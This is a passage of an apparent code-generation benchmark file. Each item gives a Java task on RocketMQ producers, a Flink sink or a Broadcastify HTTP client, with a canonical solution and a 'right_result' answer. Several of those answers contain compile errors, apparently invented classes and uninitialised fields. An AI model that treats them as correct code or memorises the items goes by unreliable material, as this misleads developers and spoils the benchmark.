this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL00;\n        } else if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL18) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL18;\n        }\n    }\n\n    public void open(Configuration parameters) throws Exception {\n        Validate.notEmpty(props, \"Producer properties can not be empty\");\n        Validate.notNull(topicSelector, \"TopicSelector can not be null\");\n        Validate.notNull(serializationSchema, \"KeyValueSerializationSchema can not be null\");\n\n        producer = new DefaultMQProducer();\n        producer.setInstanceName(String.valueOf(getRuntimeContext().getIndexOfThisSubtask()));\n        RocketMQConfig.buildProducerConfigs(props, producer);\n        batchList = new LinkedList<>();\n\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void invoke(IN input) throws Exception {\n        Message msg = prepareMessage(input);\n\n        if (batchFlushOnCheckpoint) {\n            batchList.add(msg);\n            if (batchList.size() >= batchSize) {\n                flushSync();\n            }\n            return;\n        }\n\n        if (async) {\n            try {\n                producer.send(msg, new SendCallback() {\n                    @Override\n                    public void onSuccess(SendResult sendResult) {\n                        LOG.debug(\"Async send message success! result: {}\", sendResult);\n                    }\n\n                    @Override\n                    public void onException(Throwable throwable) {\n                        if (throwable != null) {\n                            LOG.error(\"Async send message failure!\", throwable);\n                        }\n                    }\n                });\n            } catch (Exception e) {\n                LOG.error(\"Async send message failure!\", e);\n            }\n        } else {\n            try {\n                SendResult result = producer.send(msg);\n                LOG.debug(\"Sync send message result: {}\", result);\n            } catch (Exception e) {\n                LOG.error(\"Sync send message failure!\", e);\n            }\n        }\n    }\n\n    private Message prepareMessage(IN input) {\n        String topic = topicSelector.getTopic(input);\n        String tag = topicSelector.getTag(input) != null ? topicSelector.getTag(input) : \"\";\n\n        byte[] k = serializationSchema.serializeKey(input);\n        String key = k != null ? new String(k, StandardCharsets.UTF_8) : \"\";\n        byte[] value = serializationSchema.serializeValue(input);\n\n        Validate.notNull(topic, \"the message topic is null\");\n        Validate.notNull(value, \"the message body is null\");\n\n        Message msg = new Message(topic, tag, key, value);\n        if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL00) {\n            msg.setDelayTimeLevel(this.messageDeliveryDelayLevel);\n        }\n        return msg;\n    }\n\n    public void close() throws Exception {\n        if (producer != null) {\n            flushSync();\n            producer.shutdown();\n        }\n    }\n\n    private void flushSync() throws Exception {\n        if (batchFlushOnCheckpoint) {\n            synchronized (batchList) {\n                if (batchList.size() > 0) {\n                    producer.send(batchList);\n                    batchList.clear();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.flink.api.common.serialization.KeyValueSerializationSchema;\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.flink.streaming.connectors.RichSinkFunction;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> extends RichSinkFunction<IN> {\n    private static final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n    private DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> serializationSchema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = serializationSchema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n    }\n\n    @Override\n    public void open(Configuration parameters) throws Exception {\n        super.open(parameters);\n        producer = new DefaultMQProducer(props.getProperty(\"producer.group\"));\n        producer.setNamesrvAddr(props.getProperty(\"namesrv.addr\"));\n        producer.start();\n    }\n\n    @Override\n    public void invoke(IN value, Context context) throws Exception {\n        if (batchFlushOnCheckpoint && batchList.size() >= batchSize) {\n            flushBatch();\n        }\n        Message msg = prepareMessage(value);\n        if (async) {\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    // Handle success\n                }\n\n                @Override\n                public void onException(Throwable e) {\n                    // Handle exception\n                }\n            });\n        } else {\n            producer.send(msg);\n        }\n    }\n\n    private Message prepareMessage(IN value) {\n        String topic = topicSelector.getTopic(value);\n        String tag = topicSelector.getTag(value);\n        byte[] body = serializationSchema.serialize(value);\n        return new Message(topic, tag, body);\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (batchFlushOnCheckpoint) {\n            flushBatch();\n        }\n        producer.shutdown();\n    }\n\n    private void flushBatch() {\n        try {\n            producer.send(batchList);\n            batchList.clear();\n        } catch (Exception e) {\n            LOG.error(\"Failed to flush batch messages\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending ordered messages to specified topics with tags, while maintaining message order based on an order ID.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending with ordering guarantees, and resource cleanup. The class uses RocketMQ's DefaultMQProducer to send messages to a specified topic, with the ability to maintain message order through a custom MessageQueueSelector.\n\nAttributes:\n- producer: DefaultMQProducer - The core RocketMQ producer instance responsible for sending messages\n- producerGroup: String (implicit) - The producer group name passed to the constructor\n- namesrvAddr: String (implicit) - The NameServer address passed to the constructor\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes the producer with the given group name and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources\n- sendOrderedMessage: sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) -> SendResult - Sends an ordered message to the specified topic with the given tags, key, and body, using the orderId to maintain message order",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\nimport java.util.List;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) \n        throws Exception {\n        Message msg = new Message(topic, tags[orderId % tags.length], key,\n            body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        \n        SendResult sendResult = producer.send(msg, new MessageQueueSelector() {\n            @Override\n            public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                Integer id = (Integer) arg;\n                int index = id % mqs.size();\n                return mqs.get(index);\n            }\n        }, orderId);\n\n        return sendResult;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\n\nimport java.util.List;\n\npublic class Producer {\n    private final DefaultMQProducer producer;\n    private final String producerGroup;\n    private final String namesrvAddr;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) throws Exception {\n        Message msg = new Message(topic, tags, key, body.getBytes());\n        return producer.send(msg, new MessageQueueSelector() {\n            @Override\n            public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                Integer id = (Integer) arg;\n                int index = id % mqs.size();\n                return mqs.get(index);\n            }\n        }, orderId);\n    }\n}\n```"
  },
  {
    "Task_id": 385,
    "Instruction": "Task Description: Create a Java class that implements a simple RocketMQ producer to send messages to a specified topic.\n\nClass Description: The SimpleProducer class provides basic functionality to send messages to a RocketMQ broker. It handles producer initialization, message sending, and cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- SimpleProducer(String producerGroup, String namesrvAddr) -> Constructor - Initializes the producer with the specified producer group and NameServer address\n- start() -> void - Starts the producer instance to begin sending messages\n- sendMessage(String topic, String tags, String keys, byte[] body) -> void - Creates and sends a message with the specified topic, tags, keys, and body content\n- shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) throws Exception {\n        Message msg = new Message(topic, tags, keys, body);\n        producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) throws Exception {\n        Message msg = new Message(topic, tags, keys, body);\n        SendResult sendResult = producer.send(msg);\n        System.out.printf(\"%s%n\", sendResult);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Create a Java function that demonstrates how to use RocketMQ's producer to send messages to a specified topic with ACL authentication.\n\nFunction Description: This function creates and configures a RocketMQ producer with ACL authentication, sends multiple messages to a specified topic, and then shuts down the producer. It demonstrates the basic workflow of message production including producer initialization, message creation, message sending, and resource cleanup.\n\nInput: None (The function uses predefined constants for configuration)\n\nOutput: None (The function prints send results to console but doesn't return any value)\n\nMethods:\n\nproducer: producer() -> void - Main function that creates and configures the producer, sends messages, and handles shutdown\ngetAclRPCHook: getAclRPCHook() -> RPCHook - Helper function that creates and returns an ACL authentication hook using predefined credentials",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.acl.common.AclClientRPCHook;\nimport org.apache.rocketmq.acl.common.SessionCredentials;\nimport org.apache.rocketmq.remoting.RPCHook;\n\nprivate static final String ACL_ACCESS_KEY = \"RocketMQ\";\nprivate static final String ACL_SECRET_KEY = \"1234567\";\n\npublic static void producer() throws MQClientException {\n    DefaultMQProducer producer = new DefaultMQProducer(\"ProducerGroupName\", getAclRPCHook());\n    producer.setNamesrvAddr(\"127.0.0.1:9876\");\n    producer.start();\n\n    for (int i = 0; i < 128; i++)\n        try {\n            {\n                Message msg = new Message(\"TopicTest\",\n                    \"TagA\",\n                    \"OrderID188\",\n                    \"Hello world\".getBytes(RemotingHelper.DEFAULT_CHARSET));\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"%s%n\", sendResult);\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    producer.shutdown();\n}\n\nstatic RPCHook getAclRPCHook() {\n    return new AclClientRPCHook(new SessionCredentials(ACL_ACCESS_KEY,ACL_SECRET_KEY));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQProducerExample {\n\n    public static void main(String[] args) {\n        producer();\n    }\n\n    public static void producer() {\n        DefaultMQProducer producer = new DefaultMQProducer(\"please_rename_unique_group_name\");\n        producer.setNamesrvAddr(\"your_nameserver_address\");\n        \n        // Set ACL authentication hook\n        producer.setRPCHook(getAclRPCHook());\n        \n        try {\n            producer.start();\n            \n            for (int i = 0; i < 10; i++) {\n                Message msg = new Message(\"TopicTest\", \"TagA\", (\"Hello RocketMQ \" + i).getBytes());\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"%s%n\", sendResult);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            producer.shutdown();\n        }\n    }\n\n    public static RPCHook getAclRPCHook() {\n        return new AclClientRPCHook(new AccessControlCredentialsProvider(\n                \"your_access_key\",\n                \"your_secret_key\"));\n    }\n}\n```\n\nPlease replace `\"your_nameserver_address\"`, `\"your_access_key\"`, and `\"your_secret_key\"` with your actual RocketMQ nameserver address and ACL credentials."
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer for sending order-related messages to a specified topic.\n\nClass Description: The OrderProducer class is a Spring component that initializes and manages a RocketMQ producer instance. It provides methods to send test order messages and actual order objects to a configured RocketMQ topic.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the RocketMQ NameServer (injected from properties)\n- topicName: String - The target topic name for messages (injected from properties)\n\nMethods:\n- init(): void - Initializes the producer instance with configuration settings and starts it. Uses @PostConstruct to ensure initialization after dependency injection.\n- send(): void - Sends 100 test order messages to the configured topic with incrementing tags.\n- send(HOrder order): boolean - Sends a serialized order object to the configured topic, using the order ID in the message tag. Returns true if sent successfully, false otherwise.\n\nInput:\n- For send(): None\n- For send(HOrder order): order - An HOrder object representing the order to be sent\n\nOutput:\n- For send(): None\n- For send(HOrder order): boolean - Indicates whether the message was successfully sent (true) or not (false)",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport com.camp.promotion.entity.HOrder;\nimport org.apache.rocketmq.client.exception.MQBrokerException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.exception.RemotingException;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.nio.charset.StandardCharsets;\n\n@Component\npublic class OrderProducer {\n\n    private DefaultMQProducer producer;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() throws MQClientException {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(\"create_order_producer_group\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendFailed(3);\n        producer.setSendMsgTimeout(1000);\n        producer.start();\n    }\n\n    public void send() {\n        try {\n            for (int i = 0; i < 100; i++) {\n                String body = \"TEST_ORDER_\" + i;\n                Message message = new Message(topicName, \"create_order\" + i, body.getBytes(StandardCharsets.UTF_8));\n                SendResult sendResult = producer.send(message);\n            }\n        } catch (MQBrokerException | MQClientException | RemotingException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean send(HOrder order) {\n        byte[] body = JSON.toJSONBytes(order);\n        Message message = new Message(topicName, \"create_order\" + order.getId(), body);\n        SendResult sendResult;\n        try {\n            sendResult = producer.send(message);\n        } catch (MQClientException | RemotingException | MQBrokerException | InterruptedException e) {\n            return false;\n        }\n        return sendResult.getSendStatus() == SendStatus.SEND_OK;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n@Component\npublic class OrderProducer {\n    private DefaultMQProducer producer;\n    @Value(\"${rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n    @Value(\"${rocketmq.topicName}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() {\n        producer = new DefaultMQProducer(\"order-producer-group\");\n        producer.setNamesrvAddr(namesrvAddr);\n        try {\n            producer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void send() {\n        AtomicInteger tagCounter = new AtomicInteger(0);\n        for (int i = 0; i < 100; i++) {\n            Message msg = new Message(topicName, \"Tag\" + tagCounter.getAndIncrement(), (\"Order-\" + i).getBytes());\n            try {\n                producer.send(msg);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean send(HOrder order) {\n        Message msg = new Message(topicName, order.getId().toString(), SerializationUtils.serialize(order));\n        try {\n            producer.send(msg);\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with configurable group, tags, and keys.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending, and shutdown operations. The class provides methods to start the producer, send messages synchronously, and gracefully shut down the producer.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- group: String - The producer group name\n- topic: String - The topic to which messages will be sent\n- tags: String - The tags for message categorization\n- keys: String - The keys for message identification\n\nMethods:\n- Producer(String group, String topic, String tags, String keys) -> void - Constructor that initializes the producer with given group, topic, tags, and keys\n- start() -> void - Starts the producer instance\n- sendMessage(String messageContent) -> SendResult - Synchronously sends a message with the given content and returns the send result\n- shutdown() -> void - Shuts down the producer instance\n- buildCommandline(String[] args) -> CommandLine - Static method that builds and parses command line arguments for producer configuration",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.HelpFormatter;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.commons.cli.ParseException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) throws MQClientException {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n        this.producer.setInstanceName(Long.toString(System.currentTimeMillis()));\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws Exception {\n        Message msg = new Message(\n            topic,\n            tags,\n            keys,\n            messageContent.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        final Options options = new Options();\n        Option opt = new Option(\"h\", \"help\", false, \"Print help\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"g\", \"producerGroup\", true, \"Producer Group Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Topic Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"a\", \"tags\", true, \"Tags Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"k\", \"keys\", true, \"Keys Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"c\", \"msgCount\", true, \"Message Count\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        DefaultParser parser = new DefaultParser();\n        HelpFormatter hf = new HelpFormatter();\n        hf.setWidth(110);\n        CommandLine commandLine = null;\n        try {\n            commandLine = parser.parse(options, args);\n            if (commandLine.hasOption('h')) {\n                hf.printHelp(\"producer\", options, true);\n                return null;\n            }\n        } catch (ParseException e) {\n            hf.printHelp(\"producer\", options, true);\n            return null;\n        }\n\n        return commandLine;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.CommandLineParser;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.Options;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n    }\n\n    public void start() throws Exception {\n        producer.setNamesrvAddr(\"localhost:9876\");\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws Exception {\n        return producer.send(new Message(topic, tags, keys, messageContent.getBytes()));\n    }\n\n    public void shutdown() throws Exception {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        Options options = new Options();\n        options.addOption(\"g\", \"group\", true, \"producer group name\");\n        options.addOption(\"t\", \"topic\", true, \"message topic\");\n        options.addOption(\"T\", \"tags\", true, \"message tags\");\n        options.addOption(\"k\", \"keys\", true, \"message keys\");\n\n        CommandLineParser parser = new DefaultParser();\n        try {\n            return parser.parse(options, args);\n        } catch (Exception e) {\n            System.err.println(\"Error parsing command line arguments: \" + e.getMessage());\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer to send messages to a RocketMQ broker.\n\nClass Description: The RocketMQProducer class encapsulates the functionality for sending messages to a RocketMQ message broker. It handles producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- RocketMQProducer(String producerGroup, String namesrvAddr) -> void - Constructor that initializes the producer with a producer group and NameServer address. Starts the producer instance.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Creates and sends a message to the specified topic with given tags and keys. Returns the send result containing message status.\n- shutdown() -> void - Shuts down the producer instance and releases resources.\n\nInput:\n- Constructor parameters:\n  - producerGroup: String - The group name of the producer\n  - namesrvAddr: String - The address of the NameServer\n- sendMessage parameters:\n  - topic: String - The topic to send the message to\n  - tags: String - Tags for message filtering\n  - keys: String - The business key of the message\n  - body: String - The message content\n\nOutput:\n- sendMessage returns: SendResult - Contains information about the message sending operation\n- shutdown returns: void",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        try {\n            producer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) {\n        Message msg = new Message(topic, tags, keys, body.getBytes());\n        try {\n            return producer.send(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making synchronous and asynchronous HTTP requests, specifically designed for interacting with the Broadcastify API.\n\nClass Description: The BroadcastifyHttpClient class provides methods for testing API connections and sending asynchronous requests to the Broadcastify service. It uses Java's HttpClient for HTTP/2 communication with configurable timeout and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection](BroadcastifyCallConfiguration configuration) -> String - Tests the connection to the Broadcastify API by sending a synchronous multipart/form-data POST request with API key, system ID, and test flag. Returns the response body with status code or error message.\n- sendAsyncRequest: [sendAsyncRequest](HttpRequest request) -> void - Sends an HTTP request asynchronously and handles the response or error in a completion callback. Successful responses (status 200) and errors are handled separately.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class BroadcastifyHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) {\n        BroadcastifyCallBuilder bodyBuilder = new BroadcastifyCallBuilder();\n        bodyBuilder.addPart(FormField.API_KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM_ID, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((response, throwable) -> {\n                if(throwable != null || response.statusCode() != 200) {\n                    if(!(throwable instanceof IOException || throwable instanceof CompletionException)) {\n                        // Handle non-I/O errors\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpHeaders;\nimport java.util.concurrent.CompletableFuture;\n\npublic class BroadcastifyHttpClient {\n    private final HttpClient mHttpClient = HttpClient.newBuilder()\n            .version(HttpClient.Version.HTTP_2)\n            .connectTimeout(java.time.Duration.ofSeconds(20))\n            .followRedirects(HttpClient.Redirect.NORMAL)\n            .build();\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(new URI(\"https://api.broadcastify.com/v1/test\"))\n                .header(\"Content-Type\", \"multipart/form-data\")\n                .POST(HttpRequest.BodyPublishers.ofString(\n                        \"apikey=\" + configuration.getApiKey() +\n                                \"&systemid=\" + configuration.getSystemId() +\n                                \"&test=true\"))\n                .timeout(java.time.Duration.ofSeconds(20))\n                .build();\n        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response.body() + \" Status Code: \" + response.statusCode();\n    }\n\n    public void sendAsyncRequest(HttpRequest request, CompletableFuture<Void> future) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenAccept(response -> {\n                    if (response.statusCode() == 200) {\n                        future.complete(null);\n                    } else {\n                        future.completeExceptionally(new RuntimeException(\"HTTP Error: \" + response.statusCode()));\n                    }\n                })\n                